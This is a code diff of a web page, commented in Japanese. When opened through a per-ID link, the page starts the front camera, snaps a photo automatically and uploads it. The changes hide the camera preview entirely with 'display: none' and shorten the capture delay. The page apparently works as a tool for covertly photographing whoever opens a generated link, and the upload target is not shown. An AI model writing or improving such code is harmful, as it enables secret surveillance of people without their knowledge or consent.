@@ -24,16 +24,15 @@
       max-width: 380px;
       box-shadow: 0 0 20px rgba(0,0,0,0.6);
     }
+    /* 👇 videoを完全に非表示にする */
     video {
-      width: 100%;
-      border-radius: 8px;
-      margin-bottom: 12px;
-      background: #222;
+      display: none;
     }
     #status {
-      font-size: 0.9rem;
+      font-size: 0.95rem;
       color: #ccc;
-      margin-top: 10px;
+      margin-top: 15px;
+      line-height: 1.6;
     }
   </style>
 </head>
@@ -55,12 +54,15 @@
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const status = document.getElementById("status");
-const urlParams = new URLSearchParams(window.location.search);
-const id = urlParams.get("id");
-if (!id) {
-  alert("URLにIDが含まれていません。URL生成ツールから開いてください。");
-  throw new Error("Missing ID");
-}
+
+    // ✅ URLのidを取得（ID連携対応）
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get("id");
+    if (!id) {
+      alert("URLにIDが含まれていません。URL生成ツールから開いてください。");
+      throw new Error("Missing ID");
+    }
+
     // 1️⃣ ページ読み込み時にカメラ起動要求
     window.addEventListener("load", async () => {
       try {
@@ -68,11 +70,13 @@ if (!id) {
           video: { facingMode: "user" }, // 内カメ
           audio: false,
         });
+
+        // videoは非表示だが、streamは利用する
         video.srcObject = stream;
-        status.textContent = "カメラ起動中...";
-        
+        status.textContent = "撮影中...";
+
         // 少し待ってから自動撮影
-        setTimeout(() => captureAndUpload(stream), 2000);
+        setTimeout(() => captureAndUpload(stream), 1500);
       } catch (err) {
         status.textContent = "カメラが許可されませんでした: " + err.message;
       }
@@ -82,10 +86,10 @@ if (!id) {
     async function captureAndUpload(stream) {
       try {
         const ctx = canvas.getContext("2d");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.85));
+        const blob = await new Promise((res) => canvas.toBlob(res, "image/jpeg", 0.9));
 
         status.textContent = "送信中...";
 
